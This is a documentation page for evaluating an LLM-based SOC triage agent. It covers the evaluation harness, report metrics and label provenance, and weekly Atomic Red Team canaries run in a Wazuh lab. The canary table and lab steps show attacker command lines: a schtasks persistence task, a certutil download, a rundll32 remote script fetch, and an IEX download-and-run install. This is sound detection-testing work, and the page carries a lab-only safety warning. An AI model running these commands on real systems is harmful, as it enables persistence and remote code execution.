# Triage evaluation, abused-tool enrichment and canaries (Triage Step 2)

This page explains how to **measure** the Triage agent instead of trusting it:
the offline and live evaluation harness, how to read its report, how to label
cases with provenance, and how to run **canaries** (known abused-tool
techniques) in your own isolated Wazuh lab every week.

Step 2 is built on five method principles. Each change in the code cites the
one it implements.

| Principle | What it means here |
|---|---|
| **SOC triage Step 2: pull the raw log, never trust the alert summary alone** | Triage now digests **every** raw alert/event ingestion fetched (`evidence_packet.raw_alerts`), and the prompt shows ranked, duplicate-grouped alert signatures instead of "the first 12 alerts". |
| **Missing evidence = unknown, not safe** | If the raw alerts were not fetched (slim SQLite copy, failed fetch, unknown outcome), `raw_alerts.available` is `missing`, which is now **mandatory evidence**: the alert can only end as `needs_info` or `true_positive`. A missing LOLBAS cache is also "unknown", not "clean". |
| **Adversarial mimicry** | Attackers use built-in, Microsoft-signed Windows tools (certutil, rundll32, schtasks ...). Name-only matches are weak, abuse arguments are strong, a well-known binary in the wrong folder is masquerading, and a valid signature is **never** evidence of benign. |
| **Canary testing** | Known abused-tool techniques are run regularly. If any one of them is ever closed as benign, the thresholds are broken. |
| **Measure before you claim** | Real-LLM evaluation, repeated runs, labelled ground truth, and **label provenance recorded** (beware circular labels). |

---

## 1. What changed in Triage (short version)

* `agents/triage/raw_alerts.py`: the `raw_alerts` evidence-packet section.
  * **Fetch status:** `incident_source`, `fetch_succeeded`, `alerts_count`,
    `declared_alert_count`, `coverage_ratio`, and `available`.
  * **Digest over all alerts/events:** alert names, ranked signatures,
    processes and directories, command lines, hashes, signers,
    users/hosts/IPs, MITRE, `threat_desc`, context tags and behaviours.
  * Every list is capped by a named constant and states its truncation
    ("showing 20 of 165 unique command lines").
* `agents/triage/lolbas.py`: `rule_signals.lolbas` (abuse-argument matching
  against the LOLBAS catalogue) and `rule_signals.masquerade`
  (`path_mismatch`). Strong Download, Execute, AWL Bypass, UAC Bypass and
  Credentials hits, plus every `path_mismatch`, join the guard floor.
* `agents/triage/guards.py`:
  * `raw_alerts_available` is now in `MANDATORY_EVIDENCE`.
  * The abused-tool floor labels join rule (b).
* The workflow passes the `data_availability` it already recorded at
  ingestion into `TriageAgent.triage(...)`. No new network calls are made.

Refresh the LOLBAS cache once after cloning and then weekly:

```bash
python scripts/update_lolbas.py
# -> runtime/threat_data/lolbas.json  +  lolbas.meta.json (source URL, retrieved_at, sha256)
```

The LOLBAS dataset is GPL-3.0, so it is **not** committed (`runtime/threat_data/` is
git-ignored). Tests use the small self-authored fixture
`tests/fixtures/lolbas_fixture.json`.

---

## 2. Running the evaluation

The harness runs the **real** path for each case:
`run_parser_normalisation_for_dashboard()` writes into a temp dir, then
`TriageAgent.triage(force=True, parsed_context=..., data_availability=..., baseline_db_path=soc_db/soc_incidents.db)`.

It **never writes to `soc_db/`**:

* The ticket and cache DB is redirected to a temp copy (`AEGIS_TICKET_DB`).
* The baseline DB is opened read-only.
* The size and mtime of `soc_db/*.db` are compared before and after. Any
  change fails the run.

### Offline (no API key, CI)

```bash
python scripts/eval_triage.py --mode offline
python scripts/eval_triage.py --mode offline --offline-policy always_benign   # adversarial model
```

Offline mode replaces the LLM with a **scripted model**. It tests the
*harness and the guards*, not the LLM. The `always_benign` policy proposes
`benign_expected` for every case. With it the guards alone must still keep
every malicious canary off the benign side.

### Live (real OpenAI)

```bash
# .env:  OPENAI_API_KEY=sk-...   (optionally OPENAI_MODEL=...)
python scripts/eval_triage.py --mode live --dry-run            # prints the planned LLM call count only
python scripts/eval_triage.py --mode live --repeats 3
python scripts/eval_triage.py --mode live --repeats 3 --cases "tests/triage_eval/canaries/*.json"
python scripts/eval_triage.py --mode live --max-cases 3
```

Before any API call, the harness prints `cases x repeats x 3 calls = N planned LLM call(s)`.
A JSON repair call can occasionally add one more.

Exit codes:

* `0`: OK.
* `1`: any `must_not` violation, any malicious canary closed as benign in
  **any** run, or `soc_db/` changed.
* `2`: configuration error, for example live mode without a key.

### Reading the report

Each run writes `runtime/eval_reports/<timestamp>_<mode>.json` and a `.md`
summary. Both are git-ignored.

| Metric | Meaning | What "good" looks like |
|---|---|---|
| `must_not_violation_count` | Runs whose final disposition is in the case's `must_not` list (e.g. a confirmed-malicious case closed as `false_positive`). | **0**, always. Any value > 0 fails the run. |
| canaries / `failures` | Malicious canaries closed as `false_positive` or `benign_expected` in any run. | **Empty.** Any entry means the thresholds are broken. |
| `acceptable_hit_rate` | Share of labelled runs whose disposition is in `disposition_acceptable`. Also split **by label source**. | Read it per source. Only `lab_ground_truth`, `public_dataset` and `mentor_reviewed` are independent evidence. |
| `exact_match_rate` / `decisive_rate` | Share of labelled runs whose final disposition **equals** the label, and share that are not `needs_info`. Also split by label source. | `needs_info` is acceptable for every label, so a model that never decides scores 1.0 on `acceptable_hit_rate` and 0.0 here. Report both. |
| `n_labelled_cases_without_raw_alerts` | Labelled cases run without raw alerts (synthetic golden cases, or the slim SQLite copy that labelling-sheet imports use). | The guards force `needs_info` on these, so they cannot score exact matches. Swap mentor cases to an `incident_file` Respond-API export before quoting exact match. |
| `consistency_rate` / `inconsistent_cases` | Cases where all repeats agree. | High. Inconsistent cases are where the model is guessing. |
| `needs_info_rate` | Share of runs ending in `needs_info`. | Expect it to be high on the eval set: cases carry no business context, so `benign_expected` needs a cited analyst note, suppression match or `context.*` leaf (change window, asset inventory, approved prior reviews; see `triage-review.md`). |
| `proposed_disposition_distribution` vs `disposition_distribution` | What the model proposed vs what survived the guards. | The gap shows how often the guards had to step in. |
| `guard_actions_frequency` | Which guard rules fired (`a_missing_mandatory_evidence`, `b_strong_signal_floor`, ...). | Frequent `b_strong_signal_floor` on benign proposals means the model is being fooled by mimicry. |
| `citation_errors_frequency` | `unknown_path` (invented evidence) and `missing_status` (citing unknowns). | Should trend to 0 for a good model and prompt. |
| `uncertainty_distribution` | Deterministic uncertainty from evidence completeness. | Mostly `high` while context is missing. That is honest, not a bug. |
| latency / `total_tokens` | Per-case median latency and token use (live). | Use these to budget weekly runs. |

Unlabelled cases (e.g. `INC-52825_lateral_move_noise`) are run and reported
but **excluded** from accuracy.

---

## 3. Case files and label provenance

Case files live in three places:

* `tests/triage_eval/cases/` for seed cases and mentor-reviewed cases.
* `tests/triage_eval/canaries/` for synthetic canaries.
* `tests/triage_eval/lab/` for your Wazuh lab replays.

The shape is:

```json
{
  "name": "...",
  "incident": { ... }            // or "incident_file": "demo/incident_X_respond_api_export.json"
  "data_availability": { "incident_source": "netwitness_live", "alerts_fetch_succeeded": true, "alerts_count": 6 },
  "expected": { "disposition_acceptable": ["true_positive", "needs_info"],
                "must_not": ["false_positive", "benign_expected"] },
  "label": { "value": "true_positive",
             "source": "lab_ground_truth | public_dataset | analyst | mentor_reviewed | synthetic",
             "labeller": "...", "date": "YYYY-MM-DD", "rationale": "..." }
}
```

**Beware circular labels.** A label written by the people who wrote the rules,
or read from the same fields the model sees, measures *consistency with the
design*, not real-world accuracy:

* The 5 goldens are `synthetic`.
* INC-53021 is labelled `analyst` by the implementer, pending your
  confirmation. If it was your Caldera lab run, change its source to
  `lab_ground_truth`.
* INC-52825 is deliberately left **unlabelled** for the mentor.

### Mentor labelling kit

```bash
python scripts/export_labelling_sheet.py export --n 40 --out runtime/eval_reports/labelling_sheet.csv
# mentor fills: label_disposition, label_evidence (one line), reviewer, review_date
python scripts/export_labelling_sheet.py import runtime/eval_reports/labelling_sheet.csv
# -> tests/triage_eval/cases/mentor_<id>.json  (label.source = mentor_reviewed)
```

The sample is stratified:

* By detection source: ESA, NetWitness Endpoint, or other.
* By entity noise: *noisy* (the same detection and entity seen 30 or more
  times), *mid*, or *rare* (3 or fewer times).

The sheet deliberately contains **no Aegis verdict**, so the mentor labels
independently. Imported cases use the slim SQLite copy, which has no raw
alerts. For a raw-alert evaluation of a labelled incident, export it from the
Respond API into `demo/` and switch the case to `incident_file`.

Mentor handoff checklist (improvement #3; verified end to end on scratch
copies: the export gives 40 rows, 5 per stratum, the import writes valid
`mentor_*.json` cases, and the offline eval runs on them):

1. Export the sheet (command above) and send the CSV. Do **not** include any
   Aegis output.
2. The mentor labels from NetWitness itself. `needs_info` is a valid label
   when the evidence really does not decide it.
3. Import, then run `python scripts/eval_triage.py --mode live --cases
   "tests/triage_eval/cases/mentor_*.json"`. Quote `mentor_reviewed`
   exact-match **and** acceptable-hit rates, together with
   `n_labelled_cases_without_raw_alerts`. Slim-copy cases will be
   `needs_info` by design until they are switched to `incident_file`.
4. For agreement on real analyst decisions, use `scripts/blind_review.py`
   and then `export_labelling_sheet.py import-reviews` (only
   `mentor_agreed` labels become cases).

---

## 4. Canaries

### 4a. The deterministic guarantee (CI)

`tests/test_triage_step2_canaries.py` runs on every `pytest`. It feeds every
malicious canary through the guards, and through the real
`TriageAgent.triage()`, with a model that proposes `false_positive` or
`benign_expected` and cites everything it can. The guards must force
`needs_info` every time. The test also runs with no LOLBAS cache at all.

### 4b. The synthetic canaries (`tests/triage_eval/canaries/`)

Each canary is built from an Atomic Red Team test and paired with a benign
lookalike:

| Technique | Malicious canary (must never be benign) | Paired benign lookalike |
|---|---|---|
| T1053.005 | `schtasks /create /tn "T1053_005_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe"` | the Task Scheduler service starting a signed vendor updater from Program Files |
| T1105 | `certutil -urlcache -split -f https://... Atomic-license.txt` | `certutil -hashfile <file> SHA256` |
| T1218.011 | `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";...GetObject("script:https://...sct")` | `rundll32.exe shell32.dll,Control_RunDLL desk.cpl` |

The expected dispositions are:

* Malicious canary: acceptable `[true_positive, needs_info]`, must_not
  `[false_positive, benign_expected]`.
* Benign pair: acceptable `[needs_info, benign_expected]`.

### 4c. Canaries in your Wazuh lab (weekly)

> **SAFETY WARNING: lab VMs only.** Atomic Red Team really executes attacker
> techniques: it downloads files, creates scheduled tasks and runs script proxies.
> Run it **only** on an isolated lab VM you own, that is snapshotted and not
> joined to any corporate domain, network, VPN or cloud tenant. **Never** run it
> on corporate, production, shared or personal machines. Revert the snapshot
> afterwards.

1. **Snapshot** the Windows lab VM. The Wazuh agent and Sysmon must already be
   installed and reporting.
2. Install Invoke-AtomicRedTeam
   (<https://github.com/redcanaryco/invoke-atomicredteam>) in an elevated
   PowerShell on the lab VM:
   ```powershell
   IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing);
   Install-AtomicRedTeam -getAtomics
   Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force
   ```
3. Run the three techniques, noting the start and end time:
   ```powershell
   Invoke-AtomicTest T1053.005 -ShowDetailsBrief            # list the tests
   Invoke-AtomicTest T1053.005 -TestNumbers 1               # Scheduled Task Startup Script (calc.exe at logon)
   Invoke-AtomicTest T1105 -ShowDetailsBrief                # pick the "certutil download (urlcache)" test
   Invoke-AtomicTest T1105 -TestNames "certutil download (urlcache)"
   Invoke-AtomicTest T1218.011 -TestNumbers 1               # Rundll32 execute JavaScript Remote Payload With GetObject
   ```
4. **Clean up:**
   ```powershell
   Invoke-AtomicTest T1053.005 -TestNumbers 1 -Cleanup
   Invoke-AtomicTest T1105 -TestNames "certutil download (urlcache)" -Cleanup
   Invoke-AtomicTest T1218.011 -TestNumbers 1 -Cleanup
   ```
   Then revert the VM snapshot.
5. **Export the alerts from Wazuh** (index pattern `wazuh-alerts-*`) for the
   lab host and time window. Use either the dashboard (Discover, filter on
   `agent.name`, export as JSON) or the indexer API:
   ```bash
   curl -k -u admin:<password> "https://<wazuh-indexer>:9200/wazuh-alerts-*/_search?size=500" \
     -H 'Content-Type: application/json' -d '{"query":{"bool":{"filter":[
       {"term":{"agent.name":"LAB-WIN10"}},
       {"range":{"timestamp":{"gte":"2026-09-30T02:00:00Z","lte":"2026-09-30T03:00:00Z"}}}]}}}' \
     > wazuh_T1105.json
   ```
   `alerts.json` from the manager (NDJSON) also works.
6. **Convert** each technique's alerts into a case with
   `label.source = lab_ground_truth`:
   ```bash
   python scripts/wazuh_alert_to_incident.py wazuh_T1105.json --name lab_T1105_certutil \
       --label true_positive --technique T1105 --labeller "<your name>" --host LAB-WIN10 \
       --since 2026-09-30T02:15:00Z --until 2026-09-30T02:25:00Z \
       --rationale "Invoke-AtomicTest T1105 certutil urlcache, lab VM, 02:20 UTC"
   ```
   The file goes to `tests/triage_eval/lab/`. The detection source is
   `Wazuh`, and the Sysmon `parentImage`, `image`, `commandLine`, `hashes`
   and `user` fields become `filename_src/dst`, `param_src/dst`,
   `checksum_*` and `user_src`.
7. **Evaluate:**
   ```bash
   python scripts/eval_triage.py --mode live --repeats 3 --cases "tests/triage_eval/lab/*.json"
   ```
   Any lab canary closed as benign fails the run with exit 1.

**Weekly cadence:** pick a fixed slot, for example every Monday morning.

1. Run `python scripts/update_lolbas.py`.
2. Repeat steps 1-7 (or at least step 7 on the existing lab cases).
3. Run the full live eval
   (`python scripts/eval_triage.py --mode live --repeats 3`).
4. Keep the `.md` report and compare against last week. A canary failure, a
   new `must_not` violation or a drop in consistency is a regression to
   investigate before changing any prompt or threshold.

Rotate in new atomics over time, for example T1218.010 (regsvr32) or
T1218.005 (mshta), each with a paired benign lookalike.

---

## 5. Future options (not used here)

The harness is plain Python on purpose: no new runtime dependencies, and it
runs in the existing venv and CI. If the team later wants richer LLM-eval
tooling, consider these:

* **promptfoo** (Node.js), for prompt A/B matrices and model comparisons.
* **DeepEval** (Python), for LLM-as-judge metrics.

Both would sit on top of the same case files.
